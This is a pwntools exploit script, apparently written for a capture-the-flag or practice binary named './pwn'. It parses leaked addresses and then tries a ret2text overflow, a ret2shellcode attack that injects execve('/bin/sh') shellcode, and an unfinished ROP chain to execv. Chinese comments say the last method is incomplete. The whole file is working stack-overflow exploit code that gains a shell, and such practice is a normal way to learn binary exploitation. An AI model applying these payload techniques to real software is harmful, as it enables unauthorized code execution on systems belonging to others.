from pwn import *

s = process('./pwn')
context(log_level='debug', arch='amd64', os='linux')

s.recvuntil(':')
gen_shell = int(s.recvuntil('\n'), 16)
print(hex(gen_shell))
s.recvuntil(':')
global_buf = int(s.recvuntil('\n'), 16)
s.recvuntil(':')
execv = int(s.recvuntil('\n'), 16)

"""
gen_shell:0x4011e6
global_buf:0x404080
execv:0x7f3ac9f0f8e0
"""


def func1():
    # ret_to_text
    s.recvuntil('global:')
    payload1 = 'a'
    s.sendline(payload1)

    payload2 = flat('a' * 88, gen_shell)
    s.sendline(payload2)


def func2():
    # ret_ot_shellcode
    payload0 = asm(shellcraft.amd64.linux.execve('/bin/sh', 0, 0))
    payload1 = asm(shellcraft.sh())
    print(len(payload0), len(payload1))  # 37, 48, payload0 小一点
    s.sendline(payload1)

    payload2 = flat('a' * 88, global_buf)
    s.sendline(payload2)


def func3():
    s.send(b'/bin/sh')
    gdb.attach(s, 'b*0x00040124D\nc')
    elf = ELF('./pwn')
    pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = 0x004013b1  # pop rsi, pop r15, ret
    # ROP(elf).find_gadget(['pop rsi', 'ret'])[0]
    global_buf_arr = global_buf  # TODO: 这里需要传数组, 怎么做
    payload2 = flat('a' * 88, pop_rdi, global_buf, pop_rsi, global_buf_arr, 0, execv)
    s.sendline(payload2)

    ...


# func1()
func2()
# func3() # 未完成, 用 func2()

s.interactive()
